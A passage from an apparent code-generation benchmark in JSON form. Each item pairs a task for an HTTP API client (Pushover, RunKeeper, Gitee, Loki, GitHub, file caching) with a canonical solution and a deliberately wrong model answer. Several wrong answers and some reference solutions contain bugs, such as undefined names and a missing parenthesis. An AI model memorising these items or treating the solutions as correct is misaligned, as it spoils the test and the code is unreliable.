    "Canonical_solution": "from hashlib import md5\nfrom json import loads as jsondecode\nfrom logging import debug, info, warning\nfrom time import mktime\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode\n\nclass Config:\n    ID = \"id\"\n    TOKEN = \"TOKEN\"\n    PROXY = None\n    TTL = None\n\nclass API:\n    SITE = \"www.dns.com\"\n    METHOD = \"POST\"\n\ndef request(action, param=None, **params):\n    if param:\n        params.update(param)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    params = signature(params)\n    info(\"%s/api/%s/ : params:%s\", API.SITE, action, params)\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n\n    conn.request(API.METHOD, '/api/' + action + '/', urlencode(params),\n                 {\"Content-type\": \"application/x-www-form-urlencoded\"})\n    response = conn.getresponse()\n    result = response.read().decode('utf8')\n    conn.close()\n\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]:%s', action, response.status, result)\n        raise Exception(result)\n    else:\n        data = jsondecode(result)\n        debug('%s : result:%s', action, data)\n        if data.get('code') != 0:\n            raise Exception(\"api error:\", data.get('message'))\n        data = data.get('data')\n        if data is None:\n            raise Exception('response data is none')\n        return data",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport json\nimport logging\nimport requests\nfrom requests.auth import HTTPBasicAuth\nfrom urllib.parse import urlencode\n\nlogger = logging.getLogger(__name__)\n\ndef request(action, param=None, **params):\n    url = '/api/' + action\n    if param is None:\n        param = {}\n    param.update(params)\n    param = sign(param)\n    try:\n        response = requests.get(url, params=param, auth=HTTPBasicAuth('user', 'pass'), proxies={'http': 'http://proxy:3128', 'https': 'http://proxy:3128'})\n        response.raise_for_status()\n        data = response.json()\n        if data['error']:\n            raise Exception(data['error'])\n        if data['data'] is None:\n            raise Exception('No data in response')\n        return data['data']\n    except requests.exceptions.HTTPError as errh:\n        logger.error(f\"Http Error: {errh}\")\n        raise\n    except requests.exceptions.ConnectionError as errc:\n        logger.error(f\"Error Connecting: {errc}\")\n        raise\n    except requests.exceptions.Timeout as errt:\n        logger.error(f\"Timeout Error: {errt}\")\n        raise\n    except requests.exceptions.RequestException as err:\n        logger.error(f\"OOps: Something Else: {err}\")\n        raise\n    except Exception as e:\n        logger.error(f\"Error: {e}\")\n        raise\n```"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a function that scrapes and extracts text content from paragraphs of a given URL using HTTP requests and HTML parsing.\n\nFunction Description: The function should make an HTTP GET request to the specified URL, parse the HTML response to extract text from all paragraph elements (<p>), and return the combined text. It should handle potential errors in the HTTP request and log successful operations.\n\nInput: \n- url (str): The URL of the webpage to scrape text from.\n\nOutput: \n- str: The combined text extracted from all paragraph elements on the webpage, or an error message if the request fails.",
    "Canonical_solution": "import requests\nfrom bs4 import BeautifulSoup\nimport logging\n\ndef scrape_text_from_url(url):\n    response = requests.get(url)\n    if response.status_code != 200:\n        return \"Error: Could not retrieve content from URL.\"\n    soup = BeautifulSoup(response.text, \"html.parser\")\n    paragraphs = soup.find_all(\"p\")\n    text = \" \".join([p.get_text() for p in paragraphs])\n    logging.info(\"web scrape done\")\n    return text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef scrape_paragraphs(url):\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n        soup = BeautifulSoup(response.text, 'html.parser')\n        paragraphs = soup.find_all('p')\n        text = ' '.join([p.get_text() for p in paragraphs])\n        print(f\"Successfully scraped text from {url}\")\n        return text\n    except requests.exceptions.RequestException as e:\n        return f\"Error: {e}\"\n```"
  },
  {
    "Task_id": 74,
    "Instruction": "Task Description: Implement a Python class that serves as a client for the Pushover notification service, capable of sending both text messages and file attachments through HTTP requests.\n\nClass Description: The PushoverClient class provides functionality to interact with the Pushover API, allowing users to send notifications with optional HTML formatting, titles, URLs, and file attachments. It handles HTTP communication and error logging.\n\nAttributes:\n- token: str - The API token for authenticating with Pushover\n- user: str - The user key identifying the recipient\n- device: str - The target device for the notification\n- pushover_url: str - The Pushover API endpoint URL\n\nMethods:\n- send_message(title: str, message: str, send_as_html: bool, additional_url: str) -> None - Sends a text notification with optional HTML formatting, title, and URL\n- send_file(file_name: str, contents: bytes, title: str, message: str, send_as_html: bool, additional_url: str) -> None - Sends a notification with a file attachment (converts SVG to PNG if needed) along with text content",
    "Canonical_solution": "import logging\nimport requests\n\nclass PushoverClient:\n    def __init__(self, token: str, user: str, device: str, pushover_url: str):\n        self.token = str(token)\n        self.user = str(user)\n        self.device = str(device)\n        self.pushover_url = str(pushover_url)\n\n    def send_message(self, title: str, message: str, send_as_html: bool, additional_url: str):\n        message_json = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"html\": 1 if send_as_html else \"\",\n            \"title\": title,\n            \"message\": message,\n            \"url\": additional_url,\n            \"device\": self.device\n        }\n\n        response = requests.post(self.pushover_url, json=message_json)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send pushover message with reason being: {response.reason} {response.text}\"\n            )\n\n    def send_file(self, file_name: str, contents: bytes, title: str, message: str, send_as_html: bool, additional_url: str):\n        if not is_image(file_name):\n            return\n            \n        if file_name.endswith(SVG_SUFFIX):\n            contents = convert_svg_to_png(contents)\n            file_name = file_name.replace(SVG_SUFFIX, PNG_SUFFIX)\n        files = {\"photo\": (file_name, contents.decode())}\n\n        message_json = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"html\": 1 if send_as_html else \"\",\n            \"title\": title,\n            \"message\": message,\n            \"url\": additional_url,\n            \"device\": self.device\n        }\n\n        response = requests.post(self.pushover_url, json=message_json, files=files)\n\n        if response.status_code != 200:\n            logging.error(\n                f\"Failed to send pushover message with reason being: {response.reason} {response.text}\"\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport logging\nimport os\nimport base64\nimport tempfile\nimport subprocess\n\nclass PushoverClient:\n    def __init__(self, token: str, user: str, device: str = None):\n        self.token = token\n        self.user = user\n        self.device = device\n        self.pushover_url = \"https://api.pushover.net/1/messages.json\"\n\n    def send_message(self, title: str, message: str, send_as_html: bool = False, additional_url: str = None) -> None:\n        data = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"title\": title,\n            \"message\": message,\n            \"html\": int(send_as_html),\n            \"url\": additional_url\n        }\n        if self.device:\n            data[\"device\"] = self.device\n        try:\n            response = requests.post(self.pushover_url, data=data)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            logging.error(f\"Failed to send message: {e}\")\n\n    def send_file(self, file_name: str, contents: bytes, title: str, message: str, send_as_html: bool = False, additional_url: str = None) -> None:\n        if file_name.endswith(\".svg\"):\n            with tempfile.NamedTemporaryFile(delete=False, suffix=\".png\") as temp_file:\n                temp_file.write(contents)\n                subprocess.run([\"convert\", temp_file.name, temp_file.name.replace(\".svg\", \".png\")])\n                file_name = temp_file.name.replace(\".svg\", \".png\")\n        with open(file_name, \"rb\") as file:\n            encoded_file = base64.b64encode(file.read()).decode(\"utf-8\")\n        data = {\n            \"token\": self.token,\n            \"user\": self.user,\n            \"title\": title,\n            \"message\": message,\n            \"html\": int(send_as_html),\n            \"url\": additional_url,\n            \"attachment\": encoded_file\n        }\n        if self.device:\n            data[\"device\"] = self.device\n        try:\n            response = requests.post(self.pushover_url, data=data)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            logging.error(f\"Failed to send file: {e}\")\n        finally:\n            if file_name.endswith(\".png\"):\n                os.remove(file_name)\n```\n"
  },
  {
    "Task_id": 79,
    "Instruction": "Task Description: Create a Python class that implements HTTP client functionality for interacting with the RunKeeper API, including rate limiting, authorization handling, and standard HTTP methods (GET, POST, DELETE).\n\nClass Description: The RunKeeperAPI class provides methods to interact with the RunKeeper web service API. It handles rate limiting, authorization, and provides wrapper methods for common HTTP operations. The class includes rate limit tracking and proper error handling for API responses.\n\nAttributes:\n_RATE_LIMIT_KEY: str - Redis key used for tracking global rate limit status\n\nMethods:\n_rate_limit: [Name](endpoint: str, req_lambda: Callable) -> requests.Response - Handles rate limiting logic by checking Redis for existing rate limits and processing API responses for rate limit errors\n_api_headers: [Name](service_record: object) -> dict - Generates authorization headers for API requests using the service record's token\nget_request: [Name](url: str, service_record: object) -> dict - Performs an HTTP GET request to the specified URL with authorization headers and returns parsed JSON response\npost_request: [Name](url: str, service_record: object, data: Optional[dict]) -> requests.Response - Performs an HTTP POST request to the specified URL with optional data and authorization headers\ndelete_request: [Name](url: str, service_record: object) -> requests.Response - Performs an HTTP DELETE request to the specified URL with authorization headers\noauth_token_request: [Name](params: dict) -> str - Handles OAuth token requests by posting to the RunKeeper token endpoint and returns the access token",
    "Canonical_solution": "from tapiriik.settings import WEB_ROOT, RUNKEEPER_CLIENT_ID, RUNKEEPER_CLIENT_SECRET\nfrom tapiriik.services.api import APIException, UserException, UserExceptionType\nimport requests\nimport urllib.parse\nimport json\nfrom datetime import timedelta\nimport re\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = \"rk:rate_limit:hit\"\n\n    def _rate_limit(self, endpoint, req_lambda):\n        if redis.get(self._RATE_LIMIT_KEY) is not None:\n            raise APIException(\"RK global rate limit previously reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        response = req_lambda()\n        if response.status_code == 429:\n            if \"user\" not in response.text:\n                timeout = timedelta(minutes=15)\n                timeout_match = re.search(r\"(\\d+) (second|minute|hour|day)\", response.text)\n                if timeout_match:\n                    timeout = timedelta(**{\"%ss\" % timeout_match.group(2): float(timeout_match.group(1))}\n                redis.setex(self._RATE_LIMIT_KEY, response.text, timeout)\n                raise APIException(\"RK global rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n            else:\n                raise APIException(\"RK user rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        return response\n\n    def _api_headers(self, service_record):\n        return {\"Authorization\": \"Bearer \" + service_record.Authorization[\"Token\"],\n                \"Accept-Charset\": \"UTF-8\"}\n\n    def get_request(self, url, service_record):\n        response = self._rate_limit(\"get_request\",\n                                  lambda: requests.get(url,\n                                                      headers=self._api_headers(service_record)))\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(\"Request failed: %s %s\" % (response.status_code, response.text))\n        return response.json()\n\n    def post_request(self, url, service_record, data=None):\n        response = self._rate_limit(\"post_request\",\n                                  lambda: requests.post(url,\n                                                       headers=self._api_headers(service_record),\n                                                       data=data))\n        response.raise_for_status()\n        return response\n\n    def delete_request(self, url, service_record):\n        response = self._rate_limit(\"delete_request\",\n                                  lambda: requests.delete(url,\n                                                         headers=self._api_headers(service_record)))\n        response.raise_for_status()\n        return response\n\n    def oauth_token_request(self, params):\n        response = self._rate_limit(\"auth_token\",\n                                  lambda: requests.post(\"https://runkeeper.com/apps/token\",\n                                                      data=urllib.parse.urlencode(params),\n                                                      headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}))\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom typing import Callable, Optional\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = 'runkeeper_rate_limit'\n\n    def _rate_limit(self, endpoint: str, req_lambda: Callable) -> requests.Response:\n        # Implement rate limiting logic here\n        pass\n\n    def _api_headers(self, service_record: object) -> dict:\n        # Generate authorization headers here\n        pass\n\n    def get_request(self, url: str, service_record: object) -> dict:\n        headers = self._api_headers(service_record)\n        response = self._rate_limit(url, lambda: requests.get(url, headers=headers))\n        return response.json()\n\n    def post_request(self, url: str, service_record: object, data: Optional[dict] = None) -> requests.Response:\n        headers = self._api_headers(service_record)\n        return self._rate_limit(url, lambda: requests.post(url, headers=headers, json=data))\n\n    def delete_request(self, url: str, service_record: object) -> requests.Response:\n        headers = self._api_headers(service_record)\n        return self._rate_limit(url, lambda: requests.delete(url, headers=headers))\n\n    def oauth_token_request(self, params: dict) -> str:\n        response = requests.post('https://runkeeper.com/apps/token', data=params)\n        return response.json()['access_token']\n```"
  },
  {
    "Task_id": 8,
    "Instruction": "Task Description: Create a Python class that manages JavaScript libraries and CSS files, loading their contents from remote URLs via HTTP/HTTPS and storing them for later use.\n\nClass Description: The `Javascript` class handles the loading and storage of JavaScript libraries and CSS files from remote sources. It provides functionality to initialize with URLs, normalize them into lists, and fetch their contents over HTTP/HTTPS connections.\n\nAttributes:\n- lib: [Sequence[str]] - List of URLs pointing to JavaScript libraries to be loaded\n- css: [Sequence[str]] - List of URLs pointing to CSS files to be loaded\n- data: [str] - Additional inline JavaScript code\n- javascript_contents: [dict[str, str]] - Dictionary mapping library URLs to their loaded content\n\nMethods:\n- __init__(data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None - Initializes the class instance, normalizing input parameters into lists\n- load_javascript_contents() -> Javascript - Loads the contents of all JavaScript libraries specified in lib attribute via HTTP/HTTPS, stores them in javascript_contents, and returns self for method chaining",
    "Canonical_solution": "from ..types import Optional, Sequence, Union\nfrom urllib.parse import urlparse\nimport http.client\n\nclass Javascript:\n    def __init__(\n        self,\n        data: Optional[str] = None,\n        lib: Optional[Union[str, Sequence]] = None,\n        css: Optional[Union[str, Sequence]] = None,\n    ):\n        if isinstance(lib, str):\n            lib = [lib]\n        elif lib is None:\n            lib = []\n        if isinstance(css, str):\n            css = [css]\n        elif css is None:\n            css = []\n        self.lib = lib\n        self.css = css\n        self.data = data or \"\"\n        self.javascript_contents = dict()\n\n    def load_javascript_contents(self):\n        for lib in self.lib:\n            parsed_url = urlparse(lib)\n            host: str = str(parsed_url.hostname)\n            port: int = parsed_url.port\n            path: str = parsed_url.path\n\n            resp: Optional[http.client.HTTPResponse] = None\n            try:\n                conn = http.client.HTTPSConnection(host, port)\n                conn.request(\"GET\", path)\n                resp = conn.getresponse()\n                if resp.status != 200:\n                    raise RuntimeError(\"Cannot load JavaScript lib: %s\" % lib)\n                self.javascript_contents[lib] = resp.read().decode(\"utf-8\")\n            finally:\n                if resp is not None:\n                    resp.close()\n        return self",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nfrom typing import Optional, Union, Sequence, Dict, Any\nimport requests\n\nclass Javascript:\n    def __init__(self, data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None:\n        self.lib = lib if isinstance(lib, list) else [lib] if lib else []\n        self.css = css if isinstance(css, list) else [css] if css else []\n        self.data = data\n        self.javascript_contents: Dict[str, str] = {}\n\n    def load_javascript_contents(self) -> 'Javascript':\n        for url in self.lib:\n            response = requests.get(url)\n            self.javascript_contents[url] = response.text\n        return self\n```\n"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Python function to interact with Gitee's API to create a new release and upload a file to that release.\n\nFunction Description: This function performs two main operations: 1) Creates a new release in a specified Gitee repository using OAuth authentication, and 2) Uploads a specified file to the created release. The function handles authentication, API requests, and response processing.\n\nInput:\n- owner (str): The owner of the Gitee repository\n- repo (str): The name of the Gitee repository\n- tag (str): The tag name for the new release\n- file_path (str): Path to the file to be uploaded (default: \"Seraphine.7z\")\n\nOutput:\n- dict: A dictionary containing:\n  - release_id (str): The ID of the created release\n  - download_url (str): The download URL of the uploaded file\n\nNote: The function requires the following environment variables to be set:\n- GITEE_OWNER\n- GITEE_REPO\n- GITEE_USERNAME\n- GITEE_PASSWORD\n- GITEE_CLIENT_ID\n- GITEE_CLIENT_SECRET",
    "Canonical_solution": "import argparse\nimport os\nimport requests\n\nGITEE_OWNER = os.environ[\"GITEE_OWNER\"]\nGITEE_REPO = os.environ[\"GITEE_REPO\"]\nGITEE_USERNAME = os.environ[\"GITEE_USERNAME\"]\nGITEE_PASSWORD = os.environ[\"GITEE_PASSWORD\"]\nGITEE_CLIENT_ID = os.environ[\"GITEE_CLIENT_ID\"]\nGITEE_CLIENT_SECRET = os.environ[\"GITEE_CLIENT_SECRET\"]\n\ndef create_new_release(owner, repo):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    TAG_NAME = args.tag\n    NAME = TAG_NAME\n    BODY = f\"Seraphine {TAG_NAME}\"\n    TARGET_COMMITISH = \"master\"\n\n    url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    data = {\n        \"tag_name\": TAG_NAME,\n        \"name\": NAME,\n        \"body\": BODY,\n        \"target_commitish\": TARGET_COMMITISH,\n    }\n    response = requests.post(url, data=data, headers=HEADERS, timeout=30)\n    if 200 <= response.status_code < 300:\n        return response.json()[\"id\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"create release on gitee failed.\")\n\ndef upload_file(onwer, repo, release_id):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    FILE_PATH = \"Seraphine.7z\"\n\n    url = f\"https://gitee.com/api/v5/repos/{onwer}/{repo}/releases/{release_id}/attach_files\"\n    files = {\"file\": open(FILE_PATH, \"rb\")}\n    response = requests.post(url, files=files, headers=HEADERS, timeout=30)\n\n    if 200 <= response.status_code < 300:\n        return response.json()[\"browser_download_url\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"push release file to Gitee failed.\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nimport json\n\ndef create_gitee_release_and_upload_file(owner, repo, tag, file_path=\"Seraphine.7z\"):\n    # Set Gitee API endpoint\n    api_url = \"https://gitee.com/api/v5\"\n\n    # Set Gitee OAuth credentials\n    username = os.getenv(\"GITEE_USERNAME\")\n    password = os.getenv(\"GITEE_PASSWORD\")\n    client_id = os.getenv(\"GITEE_CLIENT_ID\")\n    client_secret = os.getenv(\"GITEE_CLIENT_SECRET\")\n\n    # Authenticate with Gitee OAuth\n    auth_url = f\"{api_url}/oauth/token\"\n    auth_data = {\n        \"grant_type\": \"password\",\n        \"username\": username,\n        \"password\": password,\n        \"client_id\": client_id,\n        \"client_secret\": client_secret\n    }\n    auth_response = requests.post(auth_url, data=auth_data)\n    auth_response.raise_for_status()\n    access_token = auth_response.json()[\"access_token\"]\n\n    # Create a new release\n    releases_url = f\"{api_url}/repos/{owner}/{repo}/releases\"\n    release_data = {\n        \"tag_name\": tag,\n        \"target_commitish\": \"master\",\n        \"name\": tag,\n        \"body\": \"Release notes for \" + tag\n    }\n    headers = {\n        \"Authorization\": f\"token {access_token}\"\n    }\n    release_response = requests.post(releases_url, json=release_data, headers=headers)\n    release_response.raise_for_status()\n    release_data = release_response.json()\n    release_id = release_data[\"id\"]\n    download_url = release_data[\"assets_url\"]\n\n    # Upload a file to the release\n    file_url = f\"{download_url}/{file_path}\"\n    with open(file_path, \"rb\") as file:\n        upload_response = requests.post(file_url, data=file, headers=headers)\n        upload_response.raise_for_status()\n\n    return {\n        \"release_id\": release_id,\n        \"download_url\": f\"{download_url}/{file_path}\"\n    }\n```"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Python class that interacts with a Loki logging system through HTTP and WebSocket connections, allowing for querying log ranges and tailing live logs.\n\nClass Description: The LokiClient class provides methods to query historical log data (query_range) and establish a WebSocket connection for live log tailing (create_tail_ws). The LokiTailWs class manages the WebSocket connection for live log streaming.\n\nAttributes:\n- query_range_url: str - Endpoint path for querying log ranges\n- tail_url: str - Endpoint path for tailing live logs\n- base_url: str - Base URL of the Loki server\n\nMethods:\n- __init__(base_url: str) -> None - Initializes the client with the Loki server's base URL\n- query_range(query: str, start: str, end: str, limit: int = 100) -> dict - Queries log data within a specified time range\n- create_tail_ws(query: str, limit: int = 100) -> LokiTailWs - Creates a WebSocket connection for live log tailing\n\nLokiTailWs Class Description: Manages a WebSocket connection for streaming live logs from Loki.\n\nAttributes:\n- _ws: WebSocket - The active WebSocket connection\n\nMethods:\n- __init__(ws: WebSocket) -> None - Initializes with an established WebSocket connection\n- messages() -> Generator - Yields incoming log messages from the WebSocket\n- close() -> None - Closes the WebSocket connection",
    "Canonical_solution": "import urllib.parse\nimport requests\nfrom websockets.sync.client import connect as ws_connect\n\nclass LokiClient:\n    query_range_url = '/loki/api/v1/query_range'\n    tail_url = '/loki/api/v1/tail'\n\n    def __init__(self, base_url: str):\n        self.base_url = base_url.rstrip('/')\n\n    def query_range(self, query, start, end, limit=100):\n        params = {\n            'query': query,\n            'start': start,\n            'end': end,\n            'limit': limit,\n        }\n        url = f\"{self.base_url}{self.query_range_url}\"\n        response = requests.get(url, params=params)\n        if response.status_code != 200:\n            raise Exception(response.text)\n        return response.json()\n\n    def create_tail_ws(self, query, limit=100):\n        data = {'query': query, 'limit': limit}\n        params = urllib.parse.urlencode(data)\n        ws_url = f\"ws://{self.base_url[7:]}\"\n        if self.base_url.startswith('https://'):\n            ws_url = f\"wss://{self.base_url[8:]}\"\n        url = f\"{ws_url}{self.tail_url}?{params}\"\n        ws = ws_connect(url)\n        return LokiTailWs(ws)\n\nclass LokiTailWs:\n    def __init__(self, ws):\n        self._ws = ws\n\n    def messages(self):\n        for message in self._ws:\n            yield message\n\n    def close(self):\n        if self._ws:\n            self._ws.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport asyncio\nimport websockets\nimport json\nfrom typing import Generator\n\nclass LokiClient:\n    def __init__(self, base_url: str) -> None:\n        self.query_range_url = f\"{base_url}/loki/api/v1/query_range\"\n        self.tail_url = f\"{base_url}/loki/api/v1/tail\"\n        self.base_url = base_url\n\n    async def query_range(self, query: str, start: str, end: str, limit: int = 100) -> dict:\n        params = {\n            \"query\": query,\n            \"start\": start,\n            \"end\": end,\n            \"limit\": limit\n        }\n        async with websockets.connect(self.query_range_url) as ws:\n            await ws.send(json.dumps(params))\n            response = await ws.recv()\n            return json.loads(response)\n\n    async def create_tail_ws(self, query: str, limit: int = 100) -> 'LokiTailWs':\n        params = {\n            \"query\": query,\n            \"limit\": limit\n        }\n        async with websockets.connect(self.tail_url) as ws:\n            await ws.send(json.dumps(params))\n            return LokiTailWs(ws)\n\nclass LokiTailWs:\n    def __init__(self, ws: websockets.WebSocket) -> None:\n        self._ws = ws\n\n    async def messages(self) -> Generator:\n        async for message in self._ws:\n            yield json.loads(message)\n\n    async def close(self) -> None:\n        await self._ws.close()\n```\n"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Implement a set of functions to interact with the GitHub API for retrieving release, comparison, pull request, and search information.\n\nFunction Description: The functions provide HTTP client functionality to query GitHub's REST API for specific repository information using authentication tokens.\n\nInput:\n- token: str - GitHub personal access token for authentication\n- repo: str - Repository name in format 'owner/repo'\n- base: str - Base commit/tag for comparison (only for get_github_compare)\n- head: str - Head commit/tag for comparison (only for get_github_compare)\n- pr_number: int - Pull request number (only for get_github_pull_request)\n- sha: str - Commit SHA hash (only for search_github_prs)\n\nOutput:\n- get_github_release: str - Returns the latest release tag name\n- get_github_compare: dict - Returns comparison data between two commits/tags\n- get_github_pull_request: dict - Returns pull request details\n- search_github_prs: dict - Returns search results for merged PRs containing the commit SHA",
    "Canonical_solution": "import requests\n\ndef get_github_release(token, repo):\n    response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                          headers={'Authorization': f'token {token}'})\n    while response.status_code == 401:\n        print(\"Error: Invalid GitHub API token.\")\n        token = input('Token: ').strip()\n        response = requests.get(f\"https://api.github.com/repos/{repo}/releases/latest\", \n                              headers={'Authorization': f'token {token}'})\n    release = response.json()\n    return release[\"tag_name\"]\n\ndef get_github_compare(token, repo, base, head):\n    commits = requests.get(f\"https://api.github.com/repos/{repo}/compare/{base}...{head}\", \n                          headers={'Authorization': f'token {token}'}).json()\n    return commits\n\ndef get_github_pull_request(token, repo, pr_number):\n    pr_details = requests.get(f\"https://api.github.com/repos/{repo}/pulls/{pr_number}\", \n                            headers={'Authorization': f'token {token}'}).json()\n    return pr_details\n\ndef search_github_prs(token, repo, sha):\n    prs = requests.get(f\"https://api.github.com/search/issues?q=repo:{repo}+type:pr+is:merged+{sha}\", \n                      headers={'Authorization': f'token {token}'}).json()\n    return prs",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\ndef get_github_release(token, repo):\n    headers = {'Authorization': f'token {token}'}\n    url = f'https://api.github.com/repos/{repo}/releases/latest'\n    response = requests.get(url, headers=headers)\n    return response.json().get('tag_name')\n\ndef get_github_compare(token, repo, base, head):\n    headers = {'Authorization': f'token {token}'}\n    url = f'https://api.github.com/repos/{repo}/compare/{base}...{head}'\n    response = requests.get(url, headers=headers)\n    return response.json()\n\ndef get_github_pull_request(token, repo, pr_number):\n    headers = {'Authorization': f'token {token}'}\n    url = f'https://api.github.com/repos/{repo}/pulls/{pr_number}'\n    response = requests.get(url, headers=headers)\n    return response.json()\n\ndef search_github_prs(token, repo, sha):\n    headers = {'Authorization': f'token {token}'}\n    url = f'https://api.github.com/search/issues?q=repo:{repo}+is:pr+is:merged+sha:{sha}'\n    response = requests.get(url, headers=headers)\n    return response.json()\n```"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Implement a Python function to download a file from a given URL and cache it locally, with progress tracking and ETag-based caching.\n\nFunction Description: The function should download a file from a specified URL to a local cache directory, using ETag headers for cache validation. It should show download progress and handle temporary files during download. If the file already exists in cache (verified by ETag), it should skip downloading.\n\nInput:\n- url: str - The URL of the file to download\n- cache_dir: Optional[str] - (Optional) Directory path for caching downloaded files. Defaults to DATASET_CACHE if None.\n\nOutput:\n- str - Returns the local file path where the downloaded content is cached\n\nNote: The function should:\n1. Create cache directory if it doesn't exist\n2. Check file existence using HEAD request and ETag\n3. Download with progress bar if not in cache\n4. Store metadata (URL and ETag) alongside cached file\n5. Handle temporary files safely during download\n6. Return final cache path",
    "Canonical_solution": "import os\nimport requests\nimport tempfile\nimport shutil\nimport json\nfrom tqdm import tqdm\n\nCACHE_ROOT = Path(os.getenv(\"SCISPACY_CACHE\", str(Path.home() / \".scispacy\")))\nDATASET_CACHE = str(CACHE_ROOT / \"datasets\")\n\ndef http_get(url: str, temp_file: IO) -> None:\n    req = requests.get(url, stream=True)\n    total = int(req.headers.get(\"content-length\", 0))\n    pbar = tqdm(total=total, unit=\"iB\", unit_scale=True, unit_divisor=1024)\n    for chunk in req.iter_content(chunk_size=1024):\n        if chunk:  # filter out keep-alive new chunks\n            size = temp_file.write(chunk)\n            pbar.update(size)\n    pbar.close()\n\ndef get_from_cache(url: str, cache_dir: Optional[str] = None) -> str:\n    if cache_dir is None:\n        cache_dir = DATASET_CACHE\n\n    os.makedirs(cache_dir, exist_ok=True)\n\n    response = requests.head(url, allow_redirects=True)\n    if response.status_code != 200:\n        raise IOError(\n            \"HEAD request failed for url {} with status code {}\".format(\n                url, response.status_code\n            )\n        )\n    etag = response.headers.get(\"ETag\")\n\n    filename = url_to_filename(url, etag)\n\n    cache_path = os.path.join(cache_dir, filename)\n\n    if not os.path.exists(cache_path):\n        with tempfile.NamedTemporaryFile() as temp_file:\n            print(f\"{url} not found in cache, downloading to {temp_file.name}\")\n\n            http_get(url, temp_file)\n\n            temp_file.flush()\n            temp_file.seek(0)\n\n            print(f\"Finished download, copying {temp_file.name} to cache at {cache_path}\")\n            with open(cache_path, \"wb\") as cache_file:\n                shutil.copyfileobj(temp_file, cache_file)\n\n            meta = {\"url\": url, \"etag\": etag}\n            meta_path = cache_path + \".json\"\n            with open(meta_path, \"w\") as meta_file:\n                json.dump(meta, meta_file)\n\n    return cache_path",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nfrom tqdm import tqdm\nfrom urllib.parse import urlparse\n\ndef download_file(url, cache_dir=None):\n    if cache_dir is None:\n        cache_dir = os.getenv('DATASET_CACHE', './cache')\n    os.makedirs(cache_dir, exist_ok=True)\n\n    parsed_url = urlparse(url)\n    filename = os.path.basename(parsed_url.path)\n    cache_path = os.path.join(cache_dir, filename)\n    metadata_path = cache_path + '.metadata'\n\n    if os.path.exists(metadata_path):\n        with open(metadata_path, 'r') as f:\n            cached_url, etag = f.read().strip().split('\\t')\n        if cached_url == url:\n            response = requests.head(url, headers={'If-None-Match': etag})\n            if response.status_code == 304:\n                return cache_path\n\n    response = requests.get(url, stream=True)\n    total_size = int(response.headers.get('content-length', 0))\n    block_size = 1024\n    progress_bar = tqdm(total=total_size, unit='iB', unit_scale=True)\n\n    with open(cache_path + '.tmp', 'wb') as f:\n        for data in response.iter_content(block_size):\n            progress_bar.update(len(data))\n            f.write(data)\n    progress_bar.close()\n\n    if total_size != 0 and 